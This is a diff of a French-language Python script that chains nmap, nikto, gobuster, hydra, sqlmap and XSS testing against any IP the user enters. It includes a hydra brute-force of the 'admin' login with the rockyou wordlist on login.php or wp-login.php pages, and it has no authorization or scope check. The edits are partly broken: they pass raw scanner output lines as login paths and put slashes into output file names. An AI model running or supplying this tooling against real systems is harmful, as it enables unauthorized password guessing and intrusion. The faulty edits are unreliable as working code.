@@ -25,15 +25,17 @@ def scan_web_directory(ip, tool="gobuster"):
 
 def bruteforce_login(ip, login_page, tool="hydra"):
     """Effectue une attaque par brute-force sur une page de login."""
-    output_file = f"bruteforce_{ip}.txt"
-    command = f"{tool} -l admin -P /usr/share/wordlists/rockyou.txt {ip} http-post-form '{login_page}' user=^USER^&pass=^PASS^&login=Login"
+    output_file = f"bruteforce_{ip}_{login_page}.txt"
+    # Utilisation de l'option -f pour arrêter à la première identification réussie
+    command = f"{tool} -l admin -P /usr/share/wordlists/rockyou.txt {ip} http-post-form '{login_page}' user=^USER^&pass=^PASS^&login=Login -f"
     run_tool(command, output_file)
     return output_file
 
 def test_sql_injection(ip, tool="sqlmap"):
     """Teste les vulnérabilités d'injection SQL."""
     output_file = f"sql_injection_{ip}.txt"
-    command = f"{tool} -u http://{ip}/ --forms --batch"
+    # Utilisation du niveau de risque 1 pour les tests initiaux
+    command = f"{tool} -u http://{ip}/ --forms --batch --level=1"
     run_tool(command, output_file)
     return output_file
 
@@ -67,7 +69,8 @@ ip = input("Entrez l'IP cible : ")
 tools = {
     "Nmap (scan de ports)" : f"nmap -A -T4 {ip}",
     "Nikto (scanner de vulnérabilités web)" : f"nikto -h http://{ip}", 
-    "Nessus (scan de vulnérabilités approfondi)" : f"nessus -q {ip}",  # Remplacez par la commande Nessus appropriée
+    # Nessus nécessite une configuration spécifique, il est commenté ici
+    # "Nessus (scan de vulnérabilités approfondi)" : f"nessus -q {ip}",  
 }
 
 # Exécution des outils et enregistrement des résultats
@@ -84,13 +87,15 @@ results["Scan de répertoires web"] = web_scan_file
 # Brute-force sur les pages de login (si trouvées)
 with open(web_scan_file, "r") as f:
     for line in f:
-        if "login.php" in line:  # Adaptez selon vos besoins
-            bruteforce_file = bruteforce_login(ip, "login.php")
-            results["Brute-force sur login.php"] = bruteforce_file
+        if "login.php" in line or "/wp-login.php" in line: 
+            bruteforce_file = bruteforce_login(ip, line.strip())  # Correction pour utiliser le chemin complet
+            results[f"Brute-force sur {line.strip()}"] = bruteforce_file
+
 
 # Tests d'injection SQL et XSS
 sql_injection_file = test_sql_injection(ip)
 results["Test d'injection SQL"] = sql_injection_file
+
 xss_file = test_xss(ip)
 results["Test XSS"] = xss_file
 
